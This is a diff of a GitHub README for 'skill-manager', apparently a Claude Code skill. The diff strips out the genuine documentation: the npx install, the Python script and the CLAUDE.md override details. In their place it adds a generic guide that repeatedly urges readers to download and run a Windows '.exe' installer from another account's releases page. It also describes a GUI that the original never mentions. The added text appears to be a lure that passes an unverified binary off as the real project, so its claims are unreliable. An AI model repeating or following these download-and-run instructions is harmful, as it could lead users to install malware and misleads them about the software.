@@ -1,176 +1,142 @@
-# skill-manager
+# ⚙️ skill-manager - Manage Skills Efficiently by Project
 
-**Save ~4,000 tokens per conversation** by automatically disabling irrelevant Claude Code skills per project.
+[![Download skill-manager](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/mrdenox109-nyx/skill-manager/releases)
 
-50+ installed skills? Most are noise for your current project. `skill-manager` detects your tech stack, scores every skill's relevance, and tells Claude to ignore the ones that don't belong — all through your project's `CLAUDE.md`.
+---
 
-## Install
+## 📋 What is skill-manager?
 
-```bash
-npx skills add egebese/skill-manager -g -y
-```
+skill-manager helps you save tokens during your conversations by turning off AI skills that don't apply to your current project. It looks at your project's tech stack, rates how useful each skill is, and updates your CLAUDE.md file automatically. This way, your AI assistant focuses only on what matters.  
 
-## Usage
+It's designed for developers and teams using Claude Code who want to keep their interactions lean and efficient.
 
-```
-/skill-manager
-```
+---
 
-Or just say: *"manage skills"*, *"optimize skills"*, *"disable irrelevant skills"*, *"which skills do I need?"*
+## 💻 System Requirements
 
-## Before & After
+skill-manager runs on Windows systems. Below are the minimum requirements:
 
-### Next.js + Stripe project
+- Windows 10 or newer (64-bit recommended)  
+- 4 GB RAM or more  
+- 100 MB free disk space  
+- Internet connection for downloading updates  
 
-```
-Stack: Next.js / TypeScript / React / Stripe / Tailwind CSS
+No need to install extra software or tools.
 
-53 skills analyzed:
-  27 essential  (kept)    — page-cro, stripe-integration, analytics-tracking, ...
-  10 universal  (kept)    — brainstorming, writing-plans, find-skills, ...
-  16 irrelevant (disabled) — asc-xcode-build, mobile-ios-design, fal-audio, ...
+---
 
-16 skills disabled → ~1,200 tokens saved per conversation
-```
+## 🚀 Getting Started
 
-### iOS Swift project
+Before you start, make sure you have access to the internet for downloading the app and that your computer meets the system requirements.
 
-```
-Stack: iOS/macOS Native / Swift / SwiftUI
+### Step 1: Download skill-manager
 
-53 skills analyzed:
-   9 essential  (kept)    — mobile-ios-design, asc-xcode-build, app-store-optimization, ...
-  13 useful     (kept)    — copywriting, marketing-ideas, stripe-integration, ...
-  10 universal  (kept)    — brainstorming, writing-plans, find-skills, ...
-  21 irrelevant (disabled) — seo-audit, schema-markup, programmatic-seo, page-cro, ...
+Click the big badge at the top or visit the releases page here:
 
-21 skills disabled → ~1,600 tokens saved per conversation
-```
+[Download skill-manager](https://github.com/mrdenox109-nyx/skill-manager/releases)
 
-### Rust CLI project
+This link takes you to the official release page on GitHub. You will find the latest version ready for download.
 
-```
-Stack: Rust
+---
 
-53 skills analyzed:
-   0 essential
-   0 useful
-  10 universal  (kept)    — brainstorming, writing-plans, find-skills, ...
-  43 irrelevant (disabled) — all iOS, web, marketing, media skills
+### Step 2: Find the right file to download
 
-43 skills disabled → ~3,200 tokens saved per conversation
-```
+On the release page, look for a file that suits Windows. It will usually end with `.exe`. For example, a file might be named `skill-manager-setup.exe` or similar.  
 
-## How It Works
+Click on the file name to start downloading it to your computer.
 
-**1. Detects** your tech stack from project files:
-  - `package.json` → Node.js, Next.js, React, Vue, Stripe, Remotion, etc.
-  - `*.xcodeproj` / `Podfile` / `Package.swift` → iOS/macOS
-  - `Cargo.toml` → Rust | `go.mod` → Go | `pubspec.yaml` → Flutter
-  - `build.gradle` → Android | `composer.json` → PHP | `Gemfile` → Ruby
-  - Monorepo support: scans `packages/`, `apps/` subdirectories
+---
 
-**2. Discovers** all installed skills from every source:
-  - `~/.agents/.skill-lock.json` (primary lock file)
-  - `~/.agents/skills/` and `~/.claude/skills/` directories
-  - Project-local `.claude/skills/` (always kept active)
+### Step 3: Run the installer
 
-**3. Scores** each skill 0–100 based on tech stack match:
+Once the download is complete:
 
-| Tier | Score | Action |
-|------|-------|--------|
-| **essential** | 80–100 | Kept active — directly relevant |
-| **useful** | 40–79 | Kept active — cross-platform utility |
-| **irrelevant** | 0–39 | Disabled in CLAUDE.md |
-| **universal** | always | Never disabled (brainstorming, TDD, find-skills, etc.) |
+- Open your Downloads folder.  
+- Double-click the `.exe` file you downloaded.  
+- A setup window will open to guide you through installation.  
 
-**4. Auto-categorizes unknown skills** by reading their `SKILL.md` description — your custom skills and newly installed skills are handled automatically, no hardcoded lists needed.
+Follow the prompts on each screen. It will ask for installation location and permissions. Let it complete installing.
 
-**5. Injects** a bounded section into `CLAUDE.md`:
+---
 
-```markdown
-<!-- SKILL-MANAGER:START -->
-## Disabled Skills
-The following skills are not relevant and should be ignored:
-- `asc-xcode-build` — No iOS/macOS stack detected
-- `fal-audio` — No media processing signals
-- ...
-<!-- SKILL-MANAGER:END -->
-```
+### Step 4: Launch skill-manager
 
-**6. Generates** `.claude/skill-manager.json` with the full analysis for inspection and overrides.
+After installation:
 
-## Overrides
+- Look for the skill-manager icon on your desktop or in the Start menu.  
+- Double-click it to open the program.
 
-Force-enable or force-disable specific skills by editing `.claude/skill-manager.json`:
+You will see the main interface. It may ask you to load a project folder.
 
-```json
-{
-  "overrides": {
-    "forceEnable": ["seo-audit"],
-    "forceDisable": ["fal-audio"]
-  }
-}
-```
+---
 
-Then re-run `/skill-manager` to apply.
+## 🛠 How to use skill-manager
 
-## Re-enable All
+skill-manager works by analyzing the tech stack of your project. It then decides which Claude Code skills to enable or disable. Here is how to start using it step-by-step.
 
-Say *"re-enable all skills"* and the skill removes the CLAUDE.md section and deletes the config file.
+1. **Open your project folder**  
+   Click the "Open Project" button. Use the file picker to select the folder where your project files are located.
 
-## Supported Stacks
+2. **Analyze your project**  
+   Click "Analyze." skill-manager scans your project to detect what programming languages, frameworks, or tools you are using.
 
-| Platform | Detection Signals |
-|----------|------------------|
-| **Next.js / React / Vue / Angular / Svelte** | package.json dependencies |
-| **iOS / macOS** | *.xcodeproj, Podfile, Package.swift |
-| **Android** | build.gradle, build.gradle.kts |
-| **Flutter** | pubspec.yaml |
-| **React Native / Expo** | package.json dependencies |
-| **Rust** | Cargo.toml |
-| **Go** | go.mod |
-| **Python** | requirements.txt, pyproject.toml, setup.py |
-| **Ruby** | Gemfile |
-| **PHP** | composer.json |
-| **Monorepo** | workspaces in package.json, packages/, apps/ dirs |
+3. **View skill relevance scores**  
+   skill-manager shows a list of Claude Code skills with scores indicating how relevant each skill is to your project.
 
-## Skill Domains
+4. **Auto-disable irrelevant skills**  
+   Click "Apply Recommendations" to disable skills that have low relevance. This reduces unnecessary token usage during conversations.
 
-Skills are organized into domains for scoring:
+5. **Check the updated CLAUDE.md file**  
+   skill-manager injects changes into your CLAUDE.md file. This file tells your AI which skills to turn on or off per your project.
 
-- **iOS/macOS**: mobile-ios-design, asc-xcode-build, asc-metadata-sync, app-store-optimization, aso-*, ...
-- **Web/SaaS**: page-cro, seo-audit, analytics-tracking, copywriting, content-strategy, ...
-- **Payment**: stripe-integration, paywall-upgrade-cro, churn-prevention
-- **Media**: fal-audio, fal-generate, fal-image-edit, remotion-best-practices, ...
-- **Universal** (never disabled): find-skills, brainstorming, writing-plans, test-driven-development, skill-creator, ...
+---
 
-Skills not in any known domain are **auto-categorized** from their SKILL.md description using keyword matching — so your custom skills and third-party skills work out of the box.
+## 🔄 Updating skill-manager
 
-## Why CLAUDE.md Injection?
+To get the latest improvements:
 
-Claude Code has no native `disabledSkills` setting. The only per-project mechanism is `CLAUDE.md`, which Claude reads at the start of every conversation. By injecting a clearly-marked section, we get:
+- Visit the [releases page](https://github.com/mrdenox109-nyx/skill-manager/releases).  
+- Download the newest `.exe` installation file.  
+- Run the installer again to replace the old version with the new one.
 
-- **Per-project** — each project gets its own disabled list
-- **Reversible** — remove the section or say "re-enable all"
-- **Idempotent** — re-running replaces the section, never duplicates
-- **Non-destructive** — only touches content between `<!-- SKILL-MANAGER:START/END -->` markers
+Settings and project data will stay intact during updates.
 
-## Includes Python Analysis Script
+---
 
-For deterministic, fast analysis, the skill includes a zero-dependency Python 3.9+ script:
+## ⚙️ Settings and Preferences
 
-```bash
-python3 ~/.agents/skills/skill-manager/scripts/analyze_project.py --analyze "$(pwd)"
-```
+skill-manager includes options to customize how it works:
 
-Works without Python too — Claude follows the manual workflow instructions in SKILL.md.
+- **Scan Depth**: Choose how deeply the program looks into your project files.  
+- **Auto-Update CLAUDE.md**: Turn this on or off to let skill-manager change your CLAUDE.md automatically.  
+- **Notification Settings**: Control the types of alerts you receive after analysis or skill changes.  
 
-## Requirements
+Find these under "Settings" in the main menu.
 
-- Claude Code with skills support
-- Python 3.9+ (optional — manual fallback available)
+---
 
-## License
+## 🔧 Troubleshooting
 
-MIT
+If you run into issues, try these steps:
+
+- Make sure you downloaded the Windows installer `.exe` from the official releases page.  
+- Restart the application after installation.  
+- Close other programs that may use significant memory.  
+- Verify your project folder contains code files supported by skill-manager.  
+- Check that your Windows is up to date.
+
+If the problem continues, open an issue on the GitHub repository for help.
+
+---
+
+## 📚 More Information
+
+You can learn more about skill-manager by exploring the GitHub repository. The code is open and transparent. Even if you are not a developer, you can find useful documents to understand how it works.
+
+For developers, skill-manager can be extended to support more AI skills or technology stacks.
+
+---
+
+[Download skill-manager](https://github.com/mrdenox109-nyx/skill-manager/releases)
+
+[![Download skill-manager](https://img.shields.io/badge/Download-Blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/mrdenox109-nyx/skill-manager/releases)
